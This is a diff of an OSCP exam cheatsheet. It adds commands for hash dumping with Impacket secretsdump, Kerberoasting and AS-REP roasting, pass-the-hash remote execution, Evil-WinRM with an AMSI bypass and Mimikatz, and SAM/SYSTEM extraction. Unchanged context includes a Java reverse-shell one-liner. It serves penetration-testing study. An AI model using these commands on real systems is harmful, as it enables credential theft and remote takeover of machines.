@@ -3,7 +3,10 @@
 - I'll keep this updating.
 - For any suggestions mail me contact.saisathvik@gmail.com
 
+
 # Table of Content
+- [OSCP Cheatsheet](#oscp-cheatsheet)
+- [Table of Content](#table-of-content)
 - [General](#general)
   - [Important Locations](#important-locations)
   - [File Transfers](#file-transfers)
@@ -15,6 +18,8 @@
     - [fcrackzip](#fcrackzip)
     - [John](#john)
     - [Hashcat](#hashcat)
+  - [Impacket](#impacket)
+  - [Evil-Winrm](#evil-winrm)
   - [Mimikatz](#mimikatz)
   - [Ligolo-ng](#ligolo-ng)
 - [Recon and Enumeration](#recon-and-enumeration)
@@ -56,6 +61,7 @@
   - [Schedules Tasks](#schedules-tasks)
   - [Startup Apps](#startup-apps)
   - [Insecure GUI apps](#insecure-gui-apps)
+  - [SAM and SYSTEM](#sam-and-system)
   - [Passwords](#passwords)
     - [Sensitive files](#sensitive-files)
     - [Config files](#config-files)
@@ -510,7 +516,6 @@ fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt <FILE>.zip #Cracking zip fil
 ### John
 
 > [https://github.com/openwall/john/tree/bleeding-jumbo/run](https://github.com/openwall/john/tree/bleeding-jumbo/run)
-> 
 
 ```bash
 ssh2john.py id_rsa > hash
@@ -526,6 +531,77 @@ john hashfile --wordlist=rockyou.txt
 ```bash
 #Obtain the Hash module number 
 hashcat -m <number> hash wordlists.txt --force
+```
+
+## Impacket
+
+```bash
+smbclient.py [domain]/[user]:[password/password hash]@[Target IP Address] #we connect to the server rather than a share
+
+lookupsid.py [domain]/[user]:[password/password hash]@[Target IP Address] #User enumeration on target
+
+services.py [domain]/[user]:[Password/Password Hash]@[Target IP Address] [Action] #service enumeration
+
+secretsdump.py [domain]/[user]:[password/password hash]@[Target IP Address]  #Dumping hashes on target
+
+GetUserSPNs.py [domain]/[user]:[password/password hash]@[Target IP Address] -dc-ip <IP> -request  #Kerberoasting, and request option dumps TGS
+
+GetNPUsers.py test.local/ -dc-ip <IP> -usersfile usernames.txt -format hashcat -outputfile hashes.txt #Asreproasting, need to provide usernames list
+
+##RCE
+psexec.py test.local/john:password123@10.10.10.1
+psexec.py -hashes lmhash:nthash test.local/john@10.10.10.1
+
+wmiexec.py test.local/john:password123@10.10.10.1
+wmiexec.py -hashes lmhash:nthash test.local/john@10.10.10.1
+
+smbexec.py test.local/john:password123@10.10.10.1
+smbexec.py -hashes lmhash:nthash test.local/john@10.10.10.1
+
+atexec.py test.local/john:password123@10.10.10.1 <command>
+atexec.py -hashes lmhash:nthash test.local/john@10.10.10.1 <command>
+
+```
+
+## Evil-Winrm
+
+```bash
+##winrm service discovery
+nmap -p5985,5986 <IP>
+5985 - plaintext protocol
+5986 - encrypted
+
+##Login with password
+evil-winrm -i <IP> -u user -p pass
+evil-winrm -i <IP> -u user -p pass -S #if 5986 port is open
+
+##Login with Hash
+evil-winrm -i <IP> -u user -H ntlmhash
+
+##Login with key
+evil-winrm -i <IP> -c certificate.pem -k priv-key.pem -S #-c for public key and -k for private key
+
+##Logs
+evil-winrm -i <IP> -u user -p pass -l
+
+##File upload and download
+upload <file>
+download <file> <filepath-kali> #not required to provide path all time
+
+##Loading files direclty from Kali location
+evil-winrm -i <IP> -u user -p pass -s /opt/privsc/powershell #Location can be different
+Bypass-4MSI
+Invoke-Mimikatz.ps1
+Invoke-Mimikatz
+
+##evil-winrm commands
+menu # to view commands
+#There are several commands to run
+#This is an example for running a binary
+evil-winrm -i <IP> -u user -p pass -e /opt/privsc
+Bypass-4MSI
+menu
+Invoke-Binary /opt/privsc/winPEASx64.exe
 ```
 
 ## Mimikatz
@@ -564,7 +640,7 @@ sudo ip r add <subnet> dev ligolo
 
 ```
 
----
+
 
 # Recon and Enumeration
 
@@ -831,9 +907,25 @@ showmount -e <IP>
 ## SNMP Enumeration
 
 ```bash
-snmpcheck -t <IP> -c public
-snmpwalk -c public -v1 -t 10 <IP>
-snmpenum -t <IP>
+#Nmap UDP scan
+sudo nmap <IP> -A -T4 -p- -sU -v -oN nmap-udpscan.txt
+
+snmpcheck -t <IP> -c public #Better version than snmpwalk as it displays more user friendly
+
+snmpwalk -c public -v1 -t 10 <IP> #Displays entire MIB tree, MIB Means Management Information Base
+snmpwalk -c public -v1 <IP> 1.3.6.1.4.1.77.1.2.25 #Windows User enumeration
+snmpwalk -c public -v1 <IP> 1.3.6.1.2.1.25.4.2.1.2 #Windows Processes enumeration
+snmpwalk -c public -v1 <IP> 1.3.6.1.2.1.25.6.3.1.2 #Installed software enumeraion
+snmpwalk -c public -v1 <IP> 1.3.6.1.2.1.6.13.1.3 #Opened TCP Ports
+
+#Windows MIB values
+1.3.6.1.2.1.25.1.6.0 - System Processes
+1.3.6.1.2.1.25.4.2.1.2 - Running Programs
+1.3.6.1.2.1.25.4.2.1.4 - Processes Path
+1.3.6.1.2.1.25.2.3.1.4 - Storage Units
+1.3.6.1.2.1.25.6.3.1.2 - Software Name
+1.3.6.1.4.1.77.1.2.25 - User Accounts
+1.3.6.1.2.1.6.13.1.3 - TCP Local Ports
 ```
 
 ## RPC Enumeration
@@ -864,7 +956,7 @@ lsaenumsid #SID of all users
 # Web Attacks
 
 <aside>
-💡 Cross-platform PHP revershell: https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php
+💡 Cross-platform PHP revershell: ![https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php][https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php]
 </aside>
 
 ## Directory Traversal
@@ -987,7 +1079,6 @@ sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp" #/var/www
 
 ```
 
----
 
 # Exploitation
 
@@ -1030,7 +1121,7 @@ String cmd="cmd.exe";
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
 ```
 
----
+
 
 # Windows Privilege Escalation
 
@@ -1186,6 +1277,32 @@ C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp #Startup applicatio
 #Open that particular application, using "open" feature enter the following
 file://c:/windows/system32/cmd.exe 
 ```
+## SAM and SYSTEM
+
+- Check in following folders
+
+```bash
+# Usually %SYSTEMROOT% = C:\Windows
+%SYSTEMROOT%\repair\SAM
+%SYSTEMROOT%\System32\config\RegBack\SAM
+%SYSTEMROOT%\System32\config\SAM
+%SYSTEMROOT%\repair\system
+%SYSTEMROOT%\System32\config\SYSTEM
+%SYSTEMROOT%\System32\config\RegBack\system
+
+C:\windows.old
+
+#Regex, first go to c:
+dir /s SAM
+dir /s SYSTEM
+```
+
+- Obtaining Hashes from SYSTEM and SAM
+
+```bash
+impacket-secretsdump -system SYSTEM -sam SAM local #always mention local in the command
+#Now a detailed list of hashes are displayed
+```
 
 ## Passwords
 
@@ -1272,7 +1389,7 @@ runas /savecred /user:admin C:\Temp\reverse.exe
 pth-winexe -U JEEVES/administrator%aad3b43XXXXXXXX35b51404ee:e0fb1fb857XXXXXXXX238cbe81fe00 //10.129.26.210 cmd.exe
 ```
 
----
+
 
 # Linux Privilege Escalation
 
@@ -1353,7 +1470,7 @@ mount -o rw <targetIP>:<share-location> <directory path we created>
 chmod +x <binary>
 ```
 
----
+
 
 # Post Exploitation
 
@@ -1409,7 +1526,7 @@ john --wordlist=/home/sathvik/Wordlists/rockyou.txt keepasshash
 
 ## Dumping Hashes
 
-1. [Mimikatz](https://www.notion.so/Command-Cheatsheet-68d7f9b66a644a3988f256dcd73df00c?pvs=21)  
+1. Mimikatz  
 2. If this is a domain joined machine, then follow Post-exp steps for AD.
 
 ---
@@ -1634,4 +1751,3 @@ misc::cmd
 klist
 dir \\<RHOST>\admin$
 ```
-
